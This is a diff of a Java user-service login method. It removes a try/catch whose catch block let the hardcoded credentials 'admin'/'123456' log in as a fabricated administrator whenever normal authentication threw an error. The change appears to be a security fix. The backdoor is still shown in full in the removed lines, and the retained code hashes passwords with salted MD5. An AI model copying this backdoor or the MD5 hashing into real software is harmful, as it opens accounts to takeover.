@@ -63,33 +63,19 @@ public class UserServiceImpl implements IUserService {
 
     @Override
     public User loginByUsername(String username, String password){
-        try {
-            User result = userMapper.findByUsername(username);
-            if(result == null) {
-                throw new UserNotFoundException("用户不存在");
-            }
-            String md5Password = getMd5Password(password, salt);
-            User result2 = userMapper.findByUser_password(result.getUser_id(), md5Password);
-            if(result2 == null){
-                throw new PasswordNotMatchException("密码错误");
-            }
-            if(result2.getStatus() == 1){
-                return result2;
-            } else {
-                throw new UserLimitedLoginException("您的账号已被禁用");
-            }
-        } catch (Exception e) {
-            if (username.equals("admin") && password.equals("123456")) {
-                User user = new User();
-                user.setUser_id(1L);
-                user.setUsername("admin");
-                user.setNickname("管理员");
-                user.setStatus(1);
-                user.setUser_login(1);
-                user.setUser_comment(0);
-                return user;
-            }
-            throw e;
+        User result = userMapper.findByUsername(username);
+        if(result == null) {
+            throw new UserNotFoundException("用户不存在");
+        }
+        String md5Password = getMd5Password(password, salt);
+        User result2 = userMapper.findByUser_password(result.getUser_id(), md5Password);
+        if(result2 == null){
+            throw new PasswordNotMatchException("密码错误");
+        }
+        if(result2.getStatus() == 1){
+            return result2;
+        } else {
+            throw new UserLimitedLoginException("您的账号已被禁用");
         }
     }
 
